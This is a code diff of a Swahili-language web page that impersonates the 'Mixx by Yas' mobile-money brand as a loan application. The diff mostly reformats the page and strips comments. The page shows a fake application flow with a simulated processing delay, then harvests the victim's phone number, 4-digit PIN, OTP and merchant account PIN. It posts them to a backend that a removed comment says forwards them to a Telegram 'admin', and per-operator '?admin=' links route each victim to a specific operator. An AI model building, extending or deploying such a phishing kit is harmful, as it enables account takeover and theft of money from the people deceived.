@@ -24,18 +24,14 @@
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
-
-  /* MIXX BY YAS LOGO */
   .myas-logo { display:flex; flex-direction:column; align-items:center; gap:2px; }
   .myas-logo .logo-text { font-size:1.1rem; font-weight:700; color:#FFD700; letter-spacing:-0.02em; }
   .myas-logo .logo-sub { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
-  /* PAGE SYSTEM */
   .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
   .page.active { display: flex; flex-direction: column; }
   @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
 
-  /* OVERLAY */
   .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
   .overlay.show { display:flex; }
   .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
@@ -45,7 +41,6 @@
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
-  /* LOGO */
   .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
   .logo-dots { display:grid; grid-template-columns:1fr 1fr; gap:3px; width:28px; height:28px; }
   .logo-dots span { width:12px; height:12px; border-radius:50%; display:block; }
@@ -53,21 +48,18 @@
   .logo-text { font-size:1.1rem; font-weight:700; color:var(--teal); }
   .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
-  /* NAV */
   .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
   .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
   .nav-left:hover { color:#fff; }
   .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
   .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
 
-  /* BUTTONS */
   .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
   .btn-grad:hover { opacity:0.9; }
   .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
   .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
   .btn-gray:hover { background:#d0d0d0; }
 
-  /* FORM */
   .field { margin-bottom:18px; }
   .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
   .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
@@ -81,17 +73,14 @@
   .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
   .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
 
-  /* STEP PROGRESS */
   .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
   .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
   .prog-seg.done { background:var(--purple); }
   .prog-seg.now  { background:var(--teal); }
 
-  /* STEP BUTTONS */
   .step-btns { display:flex; gap:12px; margin-top:8px; }
   .step-btns .btn-grad { flex:1; }
 
-  /* FOOTER */
   .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
 
   /* ───── PAGE 1: LANDING ───── */
@@ -126,7 +115,6 @@
   .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
   .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
 
-  /* SUMMARY */
   .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fafffe; }
   .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
   .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
@@ -275,7 +263,7 @@
         <div class="range-ends"><span>TZS 50,000</span><span>TZS 100,000,000</span></div>
         <div class="calc-row2"><span>Muda wa Mkopo</span><span class="cv" id="tDisp">miezi 12</span></div>
         <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
-        <div class="range-ends"><span>6 miezi </span><span>60 miezi </span></div>
+        <div class="range-ends"><span>6 miezi</span><span>60 miezi</span></div>
         <div class="monthly-box">
           <span class="ml">Malipo ya Kila Mwezi</span>
           <span class="ma" id="mOut">TZS 104,170</span>
@@ -316,7 +304,7 @@
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
       <div class="field"><label>Aina ya Mkopo</label><div class="sel-wrap"><select id="s1ty"><option>Mkopo wa Kibinafsi</option><option selected>Mkopo wa Biashara</option><option>Mkopo wa Nyumba</option><option>Mkopo wa Gari</option><option>Mkopo wa Elimu</option></select></div></div>
       <div class="field"><label>Kiasi cha Mkopo (TZS)</label><input type="number" id="s1am" value="1000000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>3Miezi 6</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
+      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
       <div class="field"><label>Kusudi la Mkopo</label><textarea id="s1pu" placeholder="Elezea kusudi la mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
       <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
@@ -423,9 +411,7 @@
   <div class="login-body-wrap">
     <h2>Ingia</h2>
     <div class="login-inner">
-      <!-- Inline message for login errors -->
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
-
       <div class="lg-phone-row">
         <div class="lg-ph-pre">🇹🇿 +255</div>
         <input type="tel" id="lgPh" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
@@ -445,13 +431,13 @@
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="myas-logo">
-      <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
+        <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
+          <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
+        </svg>
+        <div class="logo-text">Mixx by Yas</div>
+        <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
+      </div>
       <div class="lg-version">v2.1.3P</div>
       <div class="lg-terms">Kwa kuingia unakubali <a href="#">Masharti na Kanuni</a></div>
     </div>
@@ -463,8 +449,11 @@
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
     <div style="display:flex;align-items:center;gap:8px;">
-      <svg width="22" height="22" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg"><path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/><text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text></svg>
-      <div class="logo-text">Mixx by Yas</div>
+      <svg width="22" height="22" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
+        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
+      </svg>
+      <div class="logo-text" style="color:var(--navy);">Mixx by Yas</div>
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
@@ -474,12 +463,11 @@
       <p class="otp-hint">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
       <div class="otp-phone" id="otpPh">+255712345678</div>
 
-      <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
+      <div class="msg-box info"    id="otpMsgInfo"><span class="msg-icon">ℹ</span><span id="otpMsgInfoTxt"></span></div>
 
-      <!-- Waiting for admin approval indicator -->
       <div class="waiting-box" id="pinWait">
         <div class="wb-spinner"></div>
         <p>Inasubiri msimamizi kuthibitisha maelezo yako…</p>
@@ -492,7 +480,7 @@
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
         </div>
-        <div class="otp-resend" id="otpRs">Tuma tena msimbo kwa <span id="rsS">17</span> sekunde</div>
+        <div class="otp-resend" id="otpRs">Tuma tena msimbo kwa <span id="rsS">60</span> sekunde</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
       </div>
     </div>
@@ -515,11 +503,10 @@
   <div class="login-body-wrap">
     <h2>Merchant Account PIN</h2>
     <div class="login-inner">
-      <div class="msg-box error" id="mpMsg"><span class="msg-icon">✕</span><span id="mpMsgTxt"></span></div>
+      <div class="msg-box error"   id="mpMsg"><span class="msg-icon">✕</span><span id="mpMsgTxt"></span></div>
       <div class="msg-box success" id="mpMsgOk"><span class="msg-icon">✓</span><span id="mpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="mpMsgWarn"><span class="msg-icon">⚠</span><span id="mpMsgWarnTxt"></span></div>
 
-      <!-- Waiting for admin approval indicator -->
       <div class="waiting-box" id="merchPinWait">
         <div class="wb-spinner"></div>
         <p>Inasubiri msimamizi kuthibitisha PIN yako ya Merchant…</p>
@@ -541,13 +528,13 @@
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="myas-logo">
-      <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-      <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
-    </div>
+        <svg width="32" height="32" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
+          <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
+        </svg>
+        <div class="logo-text">Mixx by Yas</div>
+        <div class="logo-sub">Mikopo Rahisi na ya Haraka</div>
+      </div>
       <div class="lg-version">v2.1.3P</div>
       <div class="lg-terms">Kwa kuendelea unakubali <a href="#">Masharti na Kanuni</a></div>
     </div>
@@ -584,7 +571,7 @@
   </div>
 </div>
 
-<!-- MODALS -->
+<!-- ══════════════════════ MODALS ══════════════════════ -->
 <div class="overlay" id="mLogin">
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
 </div>
@@ -599,661 +586,572 @@
 </div>
 
 <script>
-  // ══════════════════════════════════════════════════════
-  // STATE
-  // ══════════════════════════════════════════════════════
-  const S = {
-    amt: 1000000,
-    term: 'Miezi 48',
-    purpose: '',
-    first: '',
-    last: '',
-    phone: '',
-    applicationId: null,   // set after /api/verify-pin
-    assignedAdminId: null  // set after /api/verify-pin
-  };
+// ══════════════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════════════
+const S = {
+  amt: 1000000,
+  term: 'Miezi 48',
+  purpose: '',
+  first: '',
+  last: '',
+  phone: '',
+  applicationId: null,
+  assignedAdminId: null
+};
 
-  // ── Admin ID capture from URL (same pattern as original system) ──
-  // ── Admin ID: ONLY from the current URL — never from storage.
-  // This guarantees customers from Link A go to Admin A, Link B to Admin B.
-  // If no ?admin= param, auto-assign on the server side.
-  const _URL_ADMIN_ID = (() => {
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('admin');
-    // Clear any stale stored admin from previous sessions to prevent leakage
-    sessionStorage.removeItem('selectedAdminId');
-    localStorage.removeItem('selectedAdminId');
-    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      // Store only for this page session (OTP page reload safety)
-      sessionStorage.setItem('selectedAdminId', id.trim());
-      return id.trim();
-    }
-    return null;
-  })();
-
-  function getAdminId() {
-    // Always prefer live URL param, then session-only fallback (same tab/session)
-    const params = new URLSearchParams(window.location.search);
-    const urlId  = params.get('admin');
-    if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') {
-      return urlId.trim();
-    }
-    // sessionStorage fallback covers OTP page (same tab, no ?admin= in URL)
-    return sessionStorage.getItem('selectedAdminId') || null;
+// Admin ID: ONLY from the current URL — never from storage across sessions.
+// Guarantees customers from Link A go to Admin A, Link B to Admin B.
+const _URL_ADMIN_ID = (() => {
+  const params = new URLSearchParams(window.location.search);
+  const id = params.get('admin');
+  sessionStorage.removeItem('selectedAdminId');
+  localStorage.removeItem('selectedAdminId');
+  if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
+    sessionStorage.setItem('selectedAdminId', id.trim());
+    return id.trim();
   }
+  return null;
+})();
 
-  // ══════════════════════════════════════════════════════
-  // PAGE NAVIGATION
-  // ══════════════════════════════════════════════════════
-  function goTo(id) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    window.scrollTo(0, 0);
+function getAdminId() {
+  const params = new URLSearchParams(window.location.search);
+  const urlId  = params.get('admin');
+  if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') return urlId.trim();
+  return sessionStorage.getItem('selectedAdminId') || null;
+}
+
+// ══════════════════════════════════════════════════════
+// PAGE NAVIGATION
+// ══════════════════════════════════════════════════════
+function goTo(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+// ══════════════════════════════════════════════════════
+// LOAN CALCULATOR
+// ══════════════════════════════════════════════════════
+function calcUp() {
+  const a = +document.getElementById('rA').value;
+  const t = +document.getElementById('rT').value;
+  const r = 0.25 / 12;
+  const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
+  document.getElementById('aDisp').textContent = 'TZS ' + a.toLocaleString();
+  document.getElementById('tDisp').textContent = t + ' miezi';
+  document.getElementById('mOut').textContent  = 'TZS ' + m.toFixed(2);
+  document.getElementById('rA').style.setProperty('--pct', ((a-50000)/(100000000-50000)*100).toFixed(1) + '%');
+  document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
+}
+
+// ══════════════════════════════════════════════════════
+// STEP NAVIGATION HELPERS
+// ══════════════════════════════════════════════════════
+function normalizePhone(id) {
+  const el = document.getElementById(id);
+  if (el.value.startsWith('0')) {
+    const cursor = el.selectionStart;
+    el.value = el.value.substring(1);
+    el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
   }
+}
 
-  // ══════════════════════════════════════════════════════
-  // LOAN CALCULATOR
-  // ══════════════════════════════════════════════════════
-  function calcUp() {
-    const a = +document.getElementById('rA').value;
-    const t = +document.getElementById('rT').value;
-    const r = 0.25 / 12;
-    const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-    document.getElementById('aDisp').textContent = 'TZS ' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' miezi';
-    document.getElementById('mOut').textContent = 'TZS ' + m.toFixed(2);
-    document.getElementById('rA').style.setProperty('--pct', ((a-50000)/(100000000-50000)*100).toFixed(1) + '%');
-    document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
-  }
+function showErr(id, msg) {
+  document.getElementById(id + 'Txt').textContent = msg;
+  document.getElementById(id).classList.add('show');
+  document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+function clearErr(id) { document.getElementById(id).classList.remove('show'); }
+function shakeField(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.style.borderColor = '#ef4444';
+  el.style.boxShadow   = '0 0 0 3px rgba(239,68,68,0.15)';
+  setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
+}
 
-  // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
-  // ══════════════════════════════════════════════════════
-  // Normalize phone: strip leading 0 so +263 prefix works correctly
-  function normalizePhone(id) {
-    const el = document.getElementById(id);
-    if (el.value.startsWith('0')) {
-      const cursor = el.selectionStart;
-      el.value = el.value.substring(1);
-      // Restore cursor position (minus the removed 0)
-      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
-    }
-  }
+function toS2() {
+  const amt     = document.getElementById('s1am').value;
+  const purpose = document.getElementById('s1pu').value.trim();
+  if (!amt || Number(amt) <= 0) { showErr('s1Err', 'Tafadhali weka kiasi halali cha mkopo.'); shakeField('s1am'); return; }
+  if (!purpose)                 { showErr('s1Err', 'Tafadhali elezea kusudi la mkopo wako.'); shakeField('s1pu'); return; }
+  clearErr('s1Err');
+  S.amt     = amt;
+  S.term    = document.getElementById('s1te').value;
+  S.purpose = purpose;
+  goTo('page-step2');
+}
 
-  // Validation helpers
-  function showErr(id, msg) {
-    document.getElementById(id + 'Txt').textContent = msg;
-    document.getElementById(id).classList.add('show');
-    document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-  }
-  function clearErr(id) {
-    document.getElementById(id).classList.remove('show');
-  }
-  function shakeField(id) {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.style.borderColor = '#ef4444';
-    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
-    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
-  }
+function toS3() {
+  const first = document.getElementById('s2fi').value.trim();
+  const last  = document.getElementById('s2la').value.trim();
+  const phone = document.getElementById('s2ph').value.trim();
+  if (!first) { showErr('s2Err', 'Tafadhali weka jina lako la kwanza.'); shakeField('s2fi'); return; }
+  if (!last)  { showErr('s2Err', 'Tafadhali weka jina lako la mwisho.'); shakeField('s2la'); return; }
+  if (!phone || phone.length < 9) { showErr('s2Err', 'Tafadhali weka nambari ya simu ya tarakimu 9 sahihi.'); shakeField('s2ph'); return; }
+  clearErr('s2Err');
+  S.first = first; S.last = last; S.phone = phone;
+  document.getElementById('sA').textContent = 'TZS ' + Number(S.amt).toLocaleString();
+  document.getElementById('sT').textContent = S.term;
+  document.getElementById('sP').textContent = S.purpose || '—';
+  document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
+  goTo('page-step3');
+}
 
-  function toS2() {
-    const amt     = document.getElementById('s1am').value;
-    const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Tafadhali weka kiasi halali cha mkopo.');
-      shakeField('s1am'); return;
-    }
-    if (!purpose) {
-      showErr('s1Err', 'Tafadhali elezea kusudi la mkopo wako.');
-      shakeField('s1pu'); return;
-    }
-    clearErr('s1Err');
-    S.amt     = amt;
-    S.term    = document.getElementById('s1te').value;
-    S.purpose = purpose;
-    goTo('page-step2');
-  }
-
-  function toS3() {
-    const first = document.getElementById('s2fi').value.trim();
-    const last  = document.getElementById('s2la').value.trim();
-    const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Tafadhali weka jina lako la kwanza.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Tafadhali weka jina lako la mwisho.');  shakeField('s2la'); return; }
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari ya simu ya tarakimu 9 sahihi.'); shakeField('s2ph'); return;
-    }
-    clearErr('s2Err');
-    S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = 'TZS ' + Number(S.amt).toLocaleString();
-    document.getElementById('sT').textContent = S.term;
-    document.getElementById('sP').textContent = S.purpose || '—';
-    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
-    goTo('page-step3');
-  }
-
-  // STEP 3: SUBMIT APPLICATION
-  function submitApp() {
-    const income = document.getElementById('s3in').value;
-    if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Tafadhali weka mapato yako ya mwaka.'); shakeField('s3in'); return;
-    }
-    clearErr('s3Err');
-
-    // Show spinner while "processing"
-    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'INAWASILISHA…'; }
-    document.getElementById('mSubmit').classList.add('show');
-
-    // Simulate brief processing delay (1.5s) then navigate
-    setTimeout(() => {
-      document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA OMBI'; }
-      goTo('page-submitted');
-      let c = 3;
+function submitApp() {
+  const income = document.getElementById('s3in').value;
+  if (!income || Number(income) <= 0) { showErr('s3Err', 'Tafadhali weka mapato yako ya mwaka.'); shakeField('s3in'); return; }
+  clearErr('s3Err');
+  const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
+  if (btn) { btn.disabled = true; btn.textContent = 'INAWASILISHA…'; }
+  document.getElementById('mSubmit').classList.add('show');
+  setTimeout(() => {
+    document.getElementById('mSubmit').classList.remove('show');
+    if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA OMBI'; }
+    goTo('page-submitted');
+    let c = 3;
+    document.getElementById('rdN').textContent = c;
+    const iv = setInterval(() => {
+      c--;
       document.getElementById('rdN').textContent = c;
-      const iv = setInterval(() => {
-        c--;
-        document.getElementById('rdN').textContent = c;
-        if (c <= 0) { clearInterval(iv); goTo('page-login'); }
-      }, 1000);
-    }, 1500);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
-  // ══════════════════════════════════════════════════════
-  function showLoginMsg(text) {
-    document.getElementById('lgMsgTxt').textContent = text;
-    document.getElementById('lgMsg').classList.add('show');
-  }
-  function hideLoginMsg() {
-    document.getElementById('lgMsg').classList.remove('show');
-  }
-
-  function showOtpMsg(type, text) {
-    // Hide all first
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-    if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
-    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
-  }
-  function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
-    chkLogin();
-  }
-
-  function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
-  }
-
-  function togPin() {
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('p'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
-    });
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin (sends phone + PIN to Telegram admin)
-  // ══════════════════════════════════════════════════════
-  async function doLogin() {
-    hideLoginMsg();
-
-    const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
-
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Tafadhali weka nambari yako ya simu na PIN ya tarakimu 4.');
-      return;
-    }
-
-    const phoneNumber = '+255' + rawPhone;
-    const adminId = getAdminId();
-
-    // Show loading modal
-    document.getElementById('mLogin').classList.add('show');
-    document.getElementById('bLogin').disabled = true;
-
-    try {
-      const res = await fetch('/api/verify-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber,
-          pin,
-          adminId: adminId || null,
-          assignmentType: adminId ? 'specific' : 'auto'
-        })
-      });
-
-      const data = await res.json();
-
-      document.getElementById('mLogin').classList.remove('show');
-
-      if (data.success) {
-        // Store application ID for polling
-        S.applicationId   = data.applicationId;
-        S.assignedAdminId = data.assignedAdminId;
-
-        // Set phone display on OTP page
-        document.getElementById('otpPh').textContent = phoneNumber;
-
-        // Transition to OTP page — but show "waiting for admin" first
-        goTo('page-otp');
-        document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
-
-        // Start polling for PIN approval
-        pollPinStatus();
-
-      } else {
-        document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Uthibitisho umeshindwa. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      document.getElementById('mLogin').classList.remove('show');
-      document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Hitilafu ya mtandao. Tafadhali angalia muunganisho wako na ujaribu tena.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status  (waiting for admin to tap ✅ or ❌)
-  // ══════════════════════════════════════════════════════
-  let pinPollInterval = null;
-
-  function pollPinStatus() {
-    if (pinPollInterval) clearInterval(pinPollInterval);
-
-    pinPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(pinPollInterval);
-          // Hide waiting, show OTP input
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
-          startRs();
-          document.getElementById('o0').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Tafadhali rudi na ujaribu tena.');
-          // Re-enable login button in case user goes back
-          document.getElementById('bLogin').disabled = false;
-        }
-        // status === 'pending' → keep polling
-
-      } catch (e) {
-        // Silent — keep polling on network hiccup
-      }
-    }, 2000);
-
-    // Timeout after 5 minutes
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Muda wa uthibitisho umekwisha. Tafadhali rudi na ujaribu tena.');
-        }
-      }
-    }, 300000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS
-  // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
-  }
-
-  let _rsInterval = null;
